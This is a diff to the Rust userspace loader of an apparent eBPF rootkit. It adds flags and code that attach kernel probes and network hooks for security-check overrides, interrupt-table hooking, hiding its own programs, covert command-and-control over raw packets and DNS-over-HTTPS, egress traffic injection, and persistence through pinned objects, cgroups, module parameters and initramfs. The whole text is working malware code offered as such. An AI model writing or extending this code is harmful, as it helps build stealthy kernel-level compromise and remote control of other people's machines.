@@ -241,6 +241,18 @@ struct Cli {
     /// Enable BPF-to-BPF parasitism (F73-F75)
     #[arg(long)]
     enable_bpf_parasitism: bool,
+
+    /// Enable advanced kernel object manipulation (F76-F80)
+    #[arg(long)]
+    enable_kernel_object: bool,
+
+    /// Enable network stealth layer (F81-F84)
+    #[arg(long)]
+    enable_network_stealth: bool,
+
+    /// Enable advanced persistence mechanisms (F85-F88)
+    #[arg(long)]
+    enable_persistence2: bool,
 }
 
 struct C2Maps {
@@ -1127,6 +1139,110 @@ async fn main() -> Result<()> {
         prog.load()?;
         prog.attach("bpf_map_update_elem", 0)?;
         info!("✓ Features 73-75: BPF Parasitism attached");
+    }
+
+    // ── Features 76-80: Advanced Kernel Object Manipulation ──
+    if cli.enable_kernel_object {
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_task_patch")
+            .context("shadow_task_patch not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("__switch_to", 0)?;
+
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_lsm_override")
+            .context("shadow_lsm_override not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("security_file_open", 0)?;
+
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_idt_hook")
+            .context("shadow_idt_hook not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("native_load_idt", 0)?;
+
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_ftrace_hide")
+            .context("shadow_ftrace_hide not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("bpf_prog_get_info_by_id", 0)?;
+
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_livepatch")
+            .context("shadow_livepatch not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("klp_enable_patch", 0)?;
+        info!("✓ Features 76-80: Advanced Kernel Object Manipulation attached");
+    }
+
+    // ── Features 81-84: Network Stealth Layer ──
+    if cli.enable_network_stealth {
+        let prog: &mut Xdp = bpf
+            .program_mut("shadow_raw_c2")
+            .context("shadow_raw_c2 not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("eth0", XdpFlags::default())?;
+
+        let _ = aya::programs::tc::qdisc_add_clsact("eth0");
+        let prog: &mut SchedClassifier = bpf
+            .program_mut("shadow_tc_inject")
+            .context("shadow_tc_inject not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("eth0", TcAttachType::Egress)?;
+
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_doh_c2")
+            .context("shadow_doh_c2 not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("tcp_sendmsg", 0)?;
+
+        let prog: &mut SchedClassifier = bpf
+            .program_mut("shadow_traffic_shape")
+            .context("shadow_traffic_shape not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("eth0", TcAttachType::Egress)?;
+        info!("✓ Features 81-84: Network Stealth Layer attached");
+    }
+
+    // ── Features 85-88: Advanced Persistence Mechanisms ──
+    if cli.enable_persistence2 {
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_obfuscated_pin")
+            .context("shadow_obfuscated_pin not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("bpf_obj_pin", 0)?;
+
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_cgroup_persist")
+            .context("shadow_cgroup_persist not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("cgroup_bpf_prog_attach", 0)?;
+
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_modparam_inject")
+            .context("shadow_modparam_inject not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("module_param_sysfs_setup", 0)?;
+
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_initramfs_persist")
+            .context("shadow_initramfs_persist not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("do_init_module", 0)?;
+        info!("✓ Features 85-88: Advanced Persistence Mechanisms attached");
     }
 
     // Populate OWN_PROG_IDS for cloaking (after all programs are loaded)
